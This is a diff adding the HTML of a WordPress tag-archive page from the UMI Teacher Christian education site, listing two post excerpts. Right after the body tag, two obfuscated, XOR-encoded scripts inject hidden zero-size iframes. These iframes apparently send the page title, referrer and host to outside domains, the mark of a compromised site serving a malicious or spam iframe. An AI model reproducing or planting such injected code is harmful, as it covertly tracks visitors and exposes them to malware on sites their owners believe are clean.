@@ -1,0 +1,236 @@
+<!doctype html>
+<!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en-US"> <![endif]-->
+<!--[if IE 7]>    <html class="no-js lt-ie9 lt-ie8" lang="en-US"> <![endif]-->
+<!--[if IE 8]>    <html class="no-js lt-ie9" lang="en-US"> <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en-US"> <!--<![endif]-->
+	<head>
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+					<link href='//fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+			  		<meta charset="UTF-8">
+
+		<meta name="viewport" content="width=device-width">
+		<meta name="author" content="http://www.umiteacher.com">
+		<title>
+			christ  |  UMI Teacher | 	
+		</title>
+		<link rel="alternate" type="application/rss+xml" title="UMI Teacher Feed" href="http://www.umiteacher.com/feed/">	
+		<script> var THEME_URI = 'http://www.umiteacher.com/wp-content/themes/CHURCHOPE';</script>
+				<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/72x72\/","ext":".png","source":{"concatemoji":"http:\/\/www.umiteacher.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.5.16"}};
+			!function(a,b,c){function d(a){var c,d,e,f=b.createElement("canvas"),g=f.getContext&&f.getContext("2d"),h=String.fromCharCode;if(!g||!g.fillText)return!1;switch(g.textBaseline="top",g.font="600 32px Arial",a){case"flag":return g.fillText(h(55356,56806,55356,56826),0,0),f.toDataURL().length>3e3;case"diversity":return g.fillText(h(55356,57221),0,0),c=g.getImageData(16,16,1,1).data,d=c[0]+","+c[1]+","+c[2]+","+c[3],g.fillText(h(55356,57221,55356,57343),0,0),c=g.getImageData(16,16,1,1).data,e=c[0]+","+c[1]+","+c[2]+","+c[3],d!==e;case"simple":return g.fillText(h(55357,56835),0,0),0!==g.getImageData(16,16,1,1).data[0];case"unicode8":return g.fillText(h(55356,57135),0,0),0!==g.getImageData(16,16,1,1).data[0]}return!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i;for(i=Array("simple","flag","unicode8","diversity"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel="stylesheet" href="http://www.umiteacher.com/wp-includes/css/dashicons.min.css?ver=4.5.16">
+<link rel="stylesheet" href="http://www.umiteacher.com/wp-includes/js/thickbox/thickbox.css?ver=4.5.16">
+<link rel="stylesheet" href="http://www.umiteacher.com/wp-content/themes/CHURCHOPE/lib/revslider/rs-plugin/css/settings.css?rev=4.5.9&#038;ver=4.5.16">
+<link rel="stylesheet" href="http://www.umiteacher.com/wp-content/plugins/jetpack/css/jetpack.css?ver=4.4.2">
+<link rel="stylesheet" href="http://www.umiteacher.com/wp-content/themes/CHURCHOPE/css/main.css">
+<link rel="stylesheet" href="http://www.umiteacher.com/wp-content/themes/CHURCHOPE/css/media.queries.css">
+<link rel="stylesheet" href="http://www.umiteacher.com/wp-content/themes/CHURCHOPE/js/prettyphoto/css/prettyPhoto.css">
+<link rel="stylesheet" href="http://www.umiteacher.com/wp-content/themes/CHURCHOPE/css/skin.css?ver=4.5.16">
+<script type='text/javascript' src='http://www.umiteacher.com/wp-includes/js/jquery/jquery.js?ver=1.12.4'></script>
+<script type='text/javascript' src='http://www.umiteacher.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
+<script type='text/javascript' src='http://www.umiteacher.com/wp-content/themes/CHURCHOPE/js/modernizr.min.js'></script>
+<script type='text/javascript' src='http://www.umiteacher.com/wp-content/themes/CHURCHOPE/js/mailchimp-widget-min.js'></script>
+<script type='text/javascript' src='http://www.umiteacher.com/wp-content/themes/CHURCHOPE/lib/revslider/rs-plugin/js/jquery.themepunch.tools.min.js?rev=4.5.9&#038;ver=4.5.16'></script>
+<script type='text/javascript' src='http://www.umiteacher.com/wp-content/themes/CHURCHOPE/lib/revslider/rs-plugin/js/jquery.themepunch.revolution.min.js?rev=4.5.9&#038;ver=4.5.16'></script>
+<link rel='https://api.w.org/' href='http://www.umiteacher.com/wp-json/' />
+
+<link rel='dns-prefetch' href='//v0.wordpress.com'>
+<style type='text/css'>img#wpstats{display:none}</style>			<link rel="shortcut icon" href="http://www.umiteacher.com.php53-7.dfw1-1.websitetestlink.com/wp-content/uploads/2013/08/Blue-UMI-Logo.jpg" />
+			<meta name="robots" content="noindex,nofollow">
+
+
+		
+		<link rel="stylesheet" href="http://www.umiteacher.com/wp-content/themes/CHURCHOPE/style.css" type="text/css" media="screen" />
+	</head>
+	<body class="archive tag tag-christ tag-116 layout_right_sidebar th_slideshow ">
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+				  <!--[if lt IE 7]><p class=chromeframe>Your browser is <em>ancient!</em> <a href="http://browsehappy.com/">Upgrade to a different browser</a> or <a href="http://www.google.com/chromeframe/?redirect=true">install Google Chrome Frame</a> to experience this site.</p><![endif]-->
+		<header class="clearfix">
+			<div class="header_bottom">
+				<div class="header_top">
+					<div class="row">
+						<div class="logo grid_6">
+																																		<a href="http://www.umiteacher.com/"><img src="http://www.umiteacher.com.php53-7.dfw1-1.websitetestlink.com/wp-content/uploads/2013/08/UMI_Teacher1.png" alt="UMI Teacher" /><span class="hidden">UMI Teacher</span></a>
+																								</div>
+						<div class="grid_6">
+												</div>
+											</div>        
+				</div>
+			</div>
+		</header>
+
+		<section id="color_header" class="clearfix">
+			<div class="mainmenu "><div class="mainmenu_inner"><div class="row clearfix"><div class="grid_12">
+			
+							<nav class="main_menu"><div id="menu-icon"><div><em></em><em></em><em></em></div>Navigation</div><ul id="menu-home" class="sf-menu clearfix mobile-menu"><li id="menu-item-1758" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1758"><a href="http://www.umiteacher.com/">Home</a></li>
+<li id="menu-item-1806" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1806"><a href="http://www.umiteacher.com/features/">Features</a></li>
+<li id="menu-item-2398" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2398"><a href="http://www.umiteacher.com/workshops/">Free Workshops</a></li>
+<li id="menu-item-1805" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1805"><a href="http://www.umiteacher.com/teaching-tips/">Teaching Tips</a></li>
+<li id="menu-item-1845" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1845"><a href="http://www.umiteacher.com/category/lesson/">Quarter At-A-Glance</a></li>
+<li id="menu-item-1807" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1807"><a href="http://www.umiteacher.com/contacts/">Contact</a></li>
+</ul></nav>
+						</div></div></div></div>	
+
+
+
+
+
+
+
+
+			</section>	
+		<section class="gray_line clearfix" id="title_sidebar">	
+			<div class="row"><div class="grid_12">
+									</div></div>
+		</section>
+		<div role="main" id="main"><div id="contentarea" class="row">
+		<div class="grid_8">    
+	
+			<article class="posts_listing post-2213 post type-post status-publish format-standard has-post-thumbnail hentry category-feature tag-christ tag-god tag-new tag-new-year tag-teach tag-teacher tag-umi" id="post-2213">
+				
+						
+					<a href="http://www.umiteacher.com/a-new-year-to-seek-god-in-christian-education/" title="A New Year to Seek God in Christian Education" class="imgborder clearfix thumb listing"><img src="http://www.umiteacher.com/wp-content/uploads/2014/01/179694082-436x356.jpg" class="attachment-blog_thumbnail size-blog_thumbnail wp-post-image" alt="179694082" /></a>
+				
+				<div class="post_title_area">
+										<div class="blogtitles  nodate"><h2 class="entry-title"><a href="http://www.umiteacher.com/a-new-year-to-seek-god-in-christian-education/" rel="bookmark" title="Permanent Link to A New Year to Seek God in Christian Education">A New Year to Seek God in Christian Education</a></h2>
+						<p class="postmeta"><a href="http://www.umiteacher.com/a-new-year-to-seek-god-in-christian-education/#respond" class="commentslink" >Comments (0)</a><span>|</span><a href="http://www.umiteacher.com/a-new-year-to-seek-god-in-christian-education/" rel="bookmark" title="Permanent Link to A New Year to Seek God in Christian Education"  class="">Read more</a></p>
+
+
+						<div class="entry-content  entry-excerpt">
+
+							<p>by Beverly Moore Do not remember the former things, or consider the things of old. I am about to do a new thing; now it springs forth, do you not perceive it? (from Isaiah 43:18&ndash;19, NRSV) A new year brings with it all the possibilities and hope of each new day. It is a time&#8230;</p>
+						</div>
+
+					</div>
+				</div>
+			</article>
+
+				
+			<article class="posts_listing post-2191 post type-post status-publish format-standard has-post-thumbnail hentry category-feature tag-christ tag-giving tag-holiday tag-jesus tag-teacher tag-volunteer" id="post-2191">
+				
+						
+					<a href="http://www.umiteacher.com/giving-beyond-the-holiday-season/" title="Giving Beyond the Holiday Season" class="imgborder clearfix thumb listing"><img src="http://www.umiteacher.com/wp-content/uploads/2013/12/80295351.jpg" class="attachment-blog_thumbnail size-blog_thumbnail wp-post-image" alt="80295351" srcset="http://www.umiteacher.com/wp-content/uploads/2013/12/80295351.jpg 507w, http://www.umiteacher.com/wp-content/uploads/2013/12/80295351-300x200.jpg 300w, http://www.umiteacher.com/wp-content/uploads/2013/12/80295351-150x100.jpg 150w" sizes="(max-width: 507px) 100vw, 507px" /></a>
+				
+				<div class="post_title_area">
+										<div class="blogtitles  nodate"><h2 class="entry-title"><a href="http://www.umiteacher.com/giving-beyond-the-holiday-season/" rel="bookmark" title="Permanent Link to Giving Beyond the Holiday Season">Giving Beyond the Holiday Season</a></h2>
+						<p class="postmeta"><a href="http://www.umiteacher.com/giving-beyond-the-holiday-season/#respond" class="commentslink" >Comments (0)</a><span>|</span><a href="http://www.umiteacher.com/giving-beyond-the-holiday-season/" rel="bookmark" title="Permanent Link to Giving Beyond the Holiday Season"  class="">Read more</a></p>
+
+
+						<div class="entry-content  entry-excerpt">
+
+							<p>by Crystal McDowell In 1949, Jim Elliot penned the following: &ldquo;He is no fool who gives what he cannot keep, to gain what he cannot lose&rdquo;. Those words are no less powerful today than when he wrote them years ago. As believers we are compelled to give beyond our comfort level. We give in faith&#8230;</p>
+						</div>
+
+					</div>
+				</div>
+			</article>
+
+						</div>
+				<aside class="grid_4 right-sidebar">
+				</aside>
+</div>
+		</div>
+		
+		<footer>
+	    <section id="footer_widgets" class="clearfix row">
+    <aside class="grid_3">
+   	<div id="text-9" class="widget widget_text"><h4  class="widget-title">Church and Ministry Resources</h4>			<div class="textwidget"><a href="http://store.urbanministries.com/eSource/ecom/eSource/default/default.aspx">URBAN MINISTRIES, INC.</a>
+
+<br>
+
+<a href="http://www.urbanministries.com/precepts/">PRECEPTS FOR LIVING</a>
+
+<br>
+
+<a 
+href="http://urbanministries.com/workshops/">FREE WORKSHOPS</a>
+
+<br>
+
+<a 
+href="http://www.urbanministriesvbs.com/">UMI VACATION BIBLE SCHOOL</a>
+
+<br>
+
+<a href="http://store.urbanministries.com/eSource/ecom/eSource/items/1-S1-lV121%20Sunday.aspx?store=/">UMI ESTORE</a>
+</div>
+		</div>    </aside>
+        <aside class="grid_3">
+   	    </aside>
+        <aside class="grid_3">
+   	<div id="churchope-social-links-2" class="widget widget_social_links"><h4  class="widget-title">FOLLOW US</h4><ul><li><a href="http://twitter.com/UMIChicago" class="twitter_account">Twitter</a></li><li><a href="http://Facebook.com/UrbanMinistriesInc" class="facebook_account">Facebook</a></li><li><a href="http://youtube.com/user/UMIandUrbanFaith" class="youtube_account">YouTube</a></li></ul></div>    </aside>
+        <aside class="grid_3">
+   	<div id="recent-comments-3" class="widget widget_recent_comments"><h4  class="widget-title">RECENT COMMENTS</h4><ul id="recentcomments"><li class="recentcomments"><span class="comment-author-link">betty sue kitchen</span> on <a href="http://www.umiteacher.com/dr-king-upstream-downstream-to-mainstream-leadership/#comment-20">Dr. King: Upstream, Downstream to Mainstream Leadership</a></li><li class="recentcomments"><span class="comment-author-link"><a href='http://urbanministries.com/inc/?p=2234' rel='external nofollow' class='url'>Christian Education Teacher Tips &laquo; Urban Ministries, Inc.</a></span> on <a href="http://www.umiteacher.com/how-to-o-p-e-n-your-sunday-school-class/#comment-19">How to O-P-E-N Your Sunday School Class</a></li></ul></div>    </aside>
+    	<div class="grid_12 dotted"></div>  
+</section> 
+    
+        <div class="row" id="copyright">
+   			 <div class="grid_5"><p>Copyright 2014 © Urban Ministries, Inc. <a href='http://www.urbanministries.com'></p></div>			 
+		 		 </div>
+			<div style="display:none">
+	</div>
+<script>
+    jQuery(document).ready(function () {
+		jQuery.post('http://www.umiteacher.com?ga_action=googleanalytics_get_script', {action: 'googleanalytics_get_script'}, function(response) {
+			var s = document.createElement("script");
+			s.type = "text/javascript";
+			s.innerHTML = response;
+			jQuery("head").append(s);
+		});
+    });
+</script><script type='text/javascript'>
+/* <![CDATA[ */
+var thickboxL10n = {"next":"Next >","prev":"< Prev","image":"Image","of":"of","close":"Close","noiframes":"This feature requires inline frames. You have iframes disabled or your browser does not support them.","loadingAnimation":"http:\/\/www.umiteacher.com\/wp-includes\/js\/thickbox\/loadingAnimation.gif"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://www.umiteacher.com/wp-includes/js/thickbox/thickbox.js?ver=3.1-20121105'></script>
+<script type='text/javascript' src='http://www.umiteacher.com/wp-includes/js/underscore.min.js?ver=1.8.3'></script>
+<script type='text/javascript' src='http://www.umiteacher.com/wp-includes/js/shortcode.min.js?ver=4.5.16'></script>
+<script type='text/javascript' src='http://www.umiteacher.com/wp-admin/js/media-upload.min.js?ver=4.5.16'></script>
+<script type='text/javascript' src='http://www.umiteacher.com/wp-includes/js/jquery/ui/core.min.js?ver=1.11.4'></script>
+<script type='text/javascript' src='http://www.umiteacher.com/wp-includes/js/jquery/ui/widget.min.js?ver=1.11.4'></script>
+<script type='text/javascript' src='http://www.umiteacher.com/wp-includes/js/jquery/ui/mouse.min.js?ver=1.11.4'></script>
+<script type='text/javascript' src='http://www.umiteacher.com/wp-includes/js/jquery/ui/sortable.min.js?ver=1.11.4'></script>
+<script type='text/javascript' src='http://www.umiteacher.com/wp-content/themes/CHURCHOPE/js/superfish/superfish.js'></script>
+<script type='text/javascript' src='http://www.umiteacher.com/wp-content/themes/CHURCHOPE/js/prettyphoto/js/jquery.prettyPhoto.js'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var ThemeData = {"admin_url":"http:\/\/www.umiteacher.com\/wp-admin\/admin-ajax.php","downloadLink":"http:\/\/www.umiteacher.com\/wp-content\/themes\/CHURCHOPE\/lib\/downloadlink.php","directory_uri":"http:\/\/www.umiteacher.com\/wp-content\/themes\/CHURCHOPE"};
+var Theme_i18n = {"wrong_connection":"Something going wrong with connection..."};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://www.umiteacher.com/wp-content/themes/CHURCHOPE/js/script.js'></script>
+<script type='text/javascript' src='http://s0.wp.com/wp-content/js/devicepx-jetpack.js?ver=201901'></script>
+<script type='text/javascript' src='http://s.gravatar.com/js/gprofiles.js?ver=2019Janaa'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var WPGroHo = {"my_hash":""};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://www.umiteacher.com/wp-content/plugins/jetpack/modules/wpgroho.js?ver=4.5.16'></script>
+<script type='text/javascript' src='http://www.umiteacher.com/wp-includes/js/wp-embed.min.js?ver=4.5.16'></script>
+<script type='text/javascript' src='http://stats.wp.com/e-201901.js' async defer></script>
+<script type='text/javascript'>
+	_stq = window._stq || [];
+	_stq.push([ 'view', {v:'ext',j:'1:4.4.2',blog:'112389998',post:'0',tz:'0',srv:'www.umiteacher.com'} ]);
+	_stq.push([ 'clickTrackerInit', '112389998', '0' ]);
+</script>
+		        </footer>
+	</body>
+</html>
